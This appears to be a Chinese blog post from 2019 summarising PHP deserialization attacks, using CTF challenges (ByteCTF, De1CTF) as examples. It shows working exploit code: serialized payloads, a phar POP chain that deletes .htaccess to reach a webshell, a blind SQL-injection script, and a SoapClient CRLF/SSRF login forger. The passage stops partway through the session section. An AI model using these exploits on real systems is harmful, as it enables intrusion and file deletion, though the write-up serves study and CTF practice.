@@ -1,0 +1,922 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-48x48-next.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Web," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言在先知看到Threezh1师傅的文章，PHP反序列化的姿势基本都有提到，无论是之前在P牛小密圈有提到的private和protect成员变量不可见字符的问题，还是一直想写的原生类反序列化，还有比较感兴趣的session反序列化；总之是一篇不错的PHP反序列化总结，学习学习！ private成员变量123456789101112131415161718&#x2F;&#x2F;private_unserialize.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP反序列化总结">
+<meta property="og:url" content="https://www.sketchplane.top/2019/10/05/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="sketch_pl4ne">
+<meta property="og:description" content="前言在先知看到Threezh1师傅的文章，PHP反序列化的姿势基本都有提到，无论是之前在P牛小密圈有提到的private和protect成员变量不可见字符的问题，还是一直想写的原生类反序列化，还有比较感兴趣的session反序列化；总之是一篇不错的PHP反序列化总结，学习学习！ private成员变量123456789101112131415161718&#x2F;&#x2F;private_unserialize.">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2019/10/06/g9CaFN.png">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2019/10/06/g9CjVe.png">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2019/10/06/g9R2q8.png">
+<meta property="og:image" content="https://xianzhi.aliyun.com/forum/media/upload/picture/20180313112022-7728da44-266d-1.png">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2019/10/07/gL5C67.png">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2019/10/07/gL5cO6.png">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2019/10/07/gL5mPT.png">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2019/10/07/gL5GHt.png">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2019/10/07/gL58CJ.png">
+<meta property="article:published_time" content="2019-10-05T01:21:37.000Z">
+<meta property="article:modified_time" content="2019-10-07T15:59:58.739Z">
+<meta property="article:author" content="sketch_pl4ne">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://t1.picb.cc/uploads/2019/10/06/g9CaFN.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://www.sketchplane.top/2019/10/05/PHP反序列化总结/"/>
+
+
+
+
+
+  <title>PHP反序列化总结 | sketch_pl4ne</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?efbba552aa6e43dbec35569bd35c0ef6";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="sketch_pl4ne" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">sketch_pl4ne</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.sketchplane.top/2019/10/05/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="sketch_pl4ne">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="sketch_pl4ne">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">PHP反序列化总结</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-05T09:21:37+08:00">
+                2019-10-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 阅读数
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.2k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  10
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在先知看到<strong>Threezh1</strong>师傅的<a href="https://xz.aliyun.com/t/6454?accounttraceid=03358f4d-fd62-479c-a546-585108ff2163#toc-2" target="_blank" rel="noopener">文章</a>，PHP反序列化的姿势基本都有提到，无论是之前在P牛小密圈有提到的private和protect成员变量不可见字符的问题，还是一直想写的原生类反序列化，还有比较感兴趣的session反序列化；总之是一篇不错的PHP反序列化总结，学习学习！</p>
+<h2 id="private成员变量"><a href="#private成员变量" class="headerlink" title="private成员变量"></a>private成员变量</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//private_unserialize.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sketch_pl4ne</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $args = <span class="string">"echo 'do something cool';"</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">($payload)</span></span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>($payload);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;execute(<span class="keyword">$this</span>-&gt;args);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> sketch_pl4ne();</span><br><span class="line">unserialize($_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//private_exp.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sketch_pl4ne</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $args = <span class="string">"echo 'do something cool';"</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">($payload)</span></span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>($payload);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">setArgs</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;args = <span class="string">"phpinfo();"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;execute(<span class="keyword">$this</span>-&gt;args);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> sketch_pl4ne();</span><br><span class="line">$o-&gt;setArgs();</span><br><span class="line"><span class="keyword">echo</span> serialize($o);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>注意：这里因为没有private成员变量的访问权限，不能用<code>-&gt;</code>设置变量值。</strong></p>
+<p>生成的payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">12</span>:<span class="string">"sketch_pl4ne"</span>:<span class="number">1</span>:&#123;s:<span class="number">18</span>:<span class="string">"sketch_pl4neargs"</span>;s:<span class="number">10</span>:<span class="string">"phpinfo();"</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是打一发发现并没有按预期输出探针页面：</p>
+<p><img src="https://t1.picb.cc/uploads/2019/10/06/g9CaFN.png" alt="1.png"></p>
+<p>原因是存在空白字符，我们需要在类名左右添加空白字符：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">12</span>:<span class="string">"sketch_pl4ne"</span>:<span class="number">1</span>:&#123;s:<span class="number">18</span>:<span class="string">"%00sketch_pl4ne%00args"</span>;s:<span class="number">10</span>:<span class="string">"phpinfo();"</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://t1.picb.cc/uploads/2019/10/06/g9CjVe.png" alt="2.png"></p>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p><strong>如果成员变量是private，类名左右需要手工添加%00，也即<code>%00className%00</code>。</strong></p>
+<h2 id="protected成员变量"><a href="#protected成员变量" class="headerlink" title="protected成员变量"></a>protected成员变量</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//protected_unserialize.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sketch_pl4ne</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $args;</span><br><span class="line">    ...</span><br><span class="line">    略</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//protected_exp.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># 同 private 变量，略</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>显然，我们直接输入构造的<code>payload</code>是会返回一个反序列化错误的：</p>
+<p><img src="https://t1.picb.cc/uploads/2019/10/06/g9R2q8.png" alt="3.png"></p>
+<p>原因与private类似，只不过不是在类名左右加空白字符，<strong>而是在出现<code>*</code>的两边加空白字符</strong>，这里<strong>Threezh1</strong>师傅貌似也是写的类名，所以还是得自己尝试一下。</p>
+<p>payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">12</span>:<span class="string">"sketch_pl4ne"</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">"%00*%00args"</span>;s:<span class="number">10</span>:<span class="string">"phpinfo();"</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><p><strong>如果成员变量是protected，需要在出现*的两侧手工添加%00，也即<code>%00\*%00</code>。</strong></p>
+<h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><p>关于之前写过一篇比较详细的<a href="https://www.sketchplane.top/2019/08/26/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%8D%E5%AD%A6%E4%B9%A0/">文章</a> ，所以不再展开写了。这里想说的是除了文件函数会触发phar反序列化之外，还有一些其他函数因为底层调用了关键函数也可以触发反序列化，所以需要我们和这些函数认识认识，不然可能找不到phar反序列化的利用点 （比如<code>mime_content_type</code> ；还有需要知道绕过开头不能用<code>phar://</code>的几个方法。</p>
+<p>下面的一些文章总结得比较全面：</p>
+<p><a href="https://xz.aliyun.com/t/6454?accounttraceid=03358f4d-fd62-479c-a546-585108ff2163#toc-8" target="_blank" rel="noopener">PHP反序列化进阶学习与总结</a></p>
+<p><a href="https://xz.aliyun.com/t/6057#toc-2" target="_blank" rel="noopener">SUCTF 2019 出题笔记 &amp; phar 反序列化的一些拓展</a></p>
+<p> <a href="https://blog.zsxsoft.com/post/38" target="_blank" rel="noopener">zsx师傅的文章</a></p>
+<h2 id="原生类利用之-ZipArchive-open"><a href="#原生类利用之-ZipArchive-open" class="headerlink" title="原生类利用之 ZipArchive::open()"></a>原生类利用之 ZipArchive::open()</h2><p>挺有意思的知识点，php内置类ZipArchive::open()中的<code>flag</code>参数如果设置为<code>ZipArchive::OVERWRITE</code>的话，可以把指定文件删除，当然前提是存在open函数，<strong>所以以后看到open()的话得多个心眼了</strong>。</p>
+<p>下面同样以 ByteCTF的 EZPHP为例，首先是一个hash长度拓展，老套路了：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input Signature: 52107b08c0f3342d2153ae1d68e6262c</span><br><span class="line">Input Data: adminadmin</span><br><span class="line">Input Key Length: 18</span><br><span class="line">Input Data to Add: test</span><br><span class="line">bcb7fda11f22c5992de2093ed0e5a654</span><br><span class="line">adminadmin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00test</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00test</span><br><span class="line">user=bcb7fda11f22c5992de2093ed0e5a654</span><br></pre></td></tr></table></figure>
+
+<p>由于 <code>mime_content_type()</code>是会触发反序列化的，接下来就是寻找POP链了：</p>
+<p><strong>将 File::checker 赋值为 Profile对象，由于不存在upload_file()函数触发__call()方法，利用ZipArchive::open删除文件。</strong></p>
+<p>exp如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//类到底是什么根据情况自行修改</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $filepath;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $filepath)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filepath = $filepath;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker = <span class="keyword">new</span> Profile();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $admin;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">"/var/www/html/sandbox/911d87b0863d6f7e544f9c938b298c66/.htaccess"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = ZipArchive::OVERWRITE | ZipArchive::CREATE;;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//不变</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'phar.phar'</span>);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line">$phar -&gt; addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//类的属性要怎么写根据情况自行修改</span></span><br><span class="line">$object = <span class="keyword">new</span> File(<span class="string">'filename'</span>, <span class="string">'filepath'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//不变</span></span><br><span class="line">$phar -&gt; setMetadata($object);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br></pre></td></tr></table></figure>
+
+<p><strong>PS：</strong>由于<code>filepath</code>存在过滤，用<code>php://filter/resource=phar://...../phar.phar</code>绕过即可。</p>
+<p>最后访问之前上传的一句话木马即可get shell。</p>
+<h2 id="原生类利用之-SoapClient-SSRF"><a href="#原生类利用之-SoapClient-SSRF" class="headerlink" title="原生类利用之 SoapClient SSRF"></a>原生类利用之 SoapClient SSRF</h2><p>这也是最近比较常见的反序列化的点了，一般出现在要求admin登录、并且要求本地登录时，走一个<code>unserialize -&gt; CRLF -&gt; SSRF</code>的利用链。</p>
+<p>这里以 De1CTF的 shellshellshell为例，明确下利用思路：</p>
+<p>首先是发现注入点，写一个脚本跑出密码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://a24cf81d-16b9-45cc-9ab1-23b73378fba1.node2.buuoj.cn.wetolink.com:82/index.php?action=publish"</span></span><br><span class="line">s = requests.session()</span><br><span class="line">cookies = &#123;<span class="string">'PHPSESSID'</span>: <span class="string">'4em1g9rscdc9mfvddp6nno8i17'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破长度</span></span><br><span class="line">max_length = <span class="number">100</span></span><br><span class="line"><span class="comment"># 字符集合</span></span><br><span class="line">character = <span class="string">"abcdef1234567890"</span></span><br><span class="line"><span class="comment"># 数据库名</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment"># 遍历每一个字符</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, max_length):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> character:</span><br><span class="line">        signature = <span class="string">"123`,(if((ascii(substr((select password from ctf_users limit 1),%d,1)))=%d,sleep(5),1)))#"</span> % (i, ord(c))</span><br><span class="line">        mood = <span class="number">0</span></span><br><span class="line">        data = &#123;<span class="string">'signature'</span>: signature, <span class="string">'mood'</span>: mood&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">            s.post(url, data=data, cookies=cookies, timeout=<span class="number">4.5</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            flag += c</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>由于admin设置了非本地ip不允许登录，光有密码还不够，我们需要SSRF绕过限制；发现sql注入同时还存在一处反序列化漏洞：</p>
+<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180313112022-7728da44-266d-1.png" alt=""></p>
+<p>生成本地admin登录报文：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">'http://127.0.0.1/index.php?action=login'</span>;</span><br><span class="line">$post_string = <span class="string">'username=admin&amp;password=用户密码&amp;code=你的验证码'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Cookie: PHPSESSID=需要成为admin的浏览器的cookie'</span></span><br><span class="line">    );</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,<span class="string">'user_agent'</span>=&gt;<span class="string">'wupco^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'^^Content-Length: '</span>.(string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string,<span class="string">'uri'</span>      =&gt; <span class="string">"aaab"</span>));</span><br><span class="line"></span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">'^^'</span>,<span class="string">"\r\n"</span>,$aaa);</span><br><span class="line">$aaa = str_replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;'</span>,$aaa);</span><br><span class="line"><span class="keyword">echo</span> bin2hex($aaa);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>最后注入，刷新浏览器即可成为admin，然后即可进入上传页面。</p>
+<h2 id="Session反序列化"><a href="#Session反序列化" class="headerlink" title="Session反序列化"></a>Session反序列化</h2><h3 id="存储机制"><a href="#存储机制" class="headerlink" title="存储机制"></a>存储机制</h3><p>PHP中session默认是以文件形式存储的，文件以<code>sess_sessionid</code>命名，内容根据序列化的处理器的不同，有相应的存储格式，序列化处理器默认为<code>php</code>，可以通过<code>php_serialize_handler</code>设置。</p>
+<h3 id="存储格式"><a href="#存储格式" class="headerlink" title="存储格式"></a>存储格式</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php：			键名|serialize(键值)</span><br><span class="line">php_serialize：	serialize(键名和键值)</span><br><span class="line">php_binary：		键名长度对应的ascii字符+键名+serialize(键值)</span><br></pre></td></tr></table></figure>
+
+<p>以一个小例子验证：</p>
